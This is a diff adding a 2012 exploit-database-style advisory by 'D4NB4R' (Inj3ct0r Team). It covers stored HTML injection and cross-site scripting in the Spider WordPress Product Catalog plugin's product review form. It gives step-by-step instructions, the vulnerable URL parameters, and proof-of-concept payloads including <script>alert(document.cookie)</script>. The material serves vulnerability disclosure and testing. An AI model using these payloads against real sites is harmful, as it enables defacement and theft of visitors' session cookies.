@@ -1,0 +1,97 @@
+ 1               #########################################              1
+ 0               I'm D4NB4R member from Inj3ct0r Team                   1
+  1               #########################################              0
+ 0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+
+ #Exploit Title: Wordpress Plugin Catalog HTML Code Injection and Cross-site scripting
+
+ Dork: N/A
+ 
+ Date: [31-10-2012]
+ 
+ Author: Daniel Barragan "D4NB4R"
+ 
+ Twitter: @D4NB4R
+  
+ Version: 1.1
+ 
+ License: Non-Commercial
+
+ Vendor: http://www.web-dorado.com/products/wordpress-catalog.html
+  
+ Tested on: [Linux(Arch)-Windows(7ultimate)]
+
+
+
+ Descripcion: 
+
+Spider WordPress Product Catalog plugin is a convenient tool for organizing the products represented on 
+your website into catalogs. Each product on the catalog is assigned with a relevant category, which makes
+it easier for the customers to search and identify the needed products within the WordPress catalog. It 
+is possible to add an unlimited number of parameters for each of the categories in the catalog in order to
+allow a detailed representation of the product on the catalog. Moreover, each product on the catalog can 
+be accompanied with an image.
+
+
+  Vulnerable Parameter Name: 
+
+                    ?s_p_c_t={Random id}&product_id={Random id}&view=showproduct&page_num={Random id}&back={Random id}
+
+ The error occurs when sending product reviews "view=showproduct" allowing the attacker 
+ to send code to your liking, not $_POST validate the form this code is stored in the db.
+                    
+
+  Exploit 1:  
+
+               HTML Code Injection 
+
+
+
+ 1. Select any of the products, click and give details or more
+
+ 2. Once done this post your code on the form with title "Add your comment here". 
+
+      An example of html:
+
+               <center><marquee><h1>HTML code Injection Tested By D4NB4R</h1></marquee></center>
+
+
+
+   http://localhost/?s_p_c_t={Random id}&product_id={Random id}&view=showproduct&page_num={Random id}&back={Random id}
+
+     
+
+
+  Exploit 2: 
+
+                Cross-site scripting 
+
+
+
+ 1. Select any of the products, click and give details or more
+
+ 2. Once done this post your code on the form with title "Add your comment here".
+
+       An example of possible xss: 
+
+                   <script>alert(document.cookie)</script>
+                   <script>alert("Xss by D4NB4R")</script>
+
+    
+    
+    http://localhost/?s_p_c_t={Random id}&product_id={Random id}&view=showproduct&page_num={Random id}&back={Random id}
+
+
+
+  Greetz:  All Member Inj3ct0r  Team * m1nds group (www.m1nds.com)* pilot * aku * navi_terrible * dedalo * ksha
+  * shine * devboot * r0073r * indoushka * KedAns-Dz * Caddy-Dz * Kalashinkov3 Jago-dz * Kha&miX * T0xic
+  * Ev!LsCr!pT_Dz * By Over-X *Saoucha * Cyber Sec * theblind74 * onurozkan * n2n * Meher Assel
+  * L0rd CruSad3r * MaYur * MA1201 * KeDar * Sonic * gunslinger_ * SeeMe * RoadKiller Sid3^effects
+  * aKa HaRi * His0k4 * Hussin-X * Rafik * Yashar * SoldierOfAllah * RiskY.HaCK * Stake * MR.SoOoFe
+  * ThE g0bL!N * AnGeL25dZ * ViRuS_Ra3cH * Sn!pEr.S!Te
+
+        
+_____________________________________________________
+Daniel Barragan "D4NB4R" 2012
+
+           
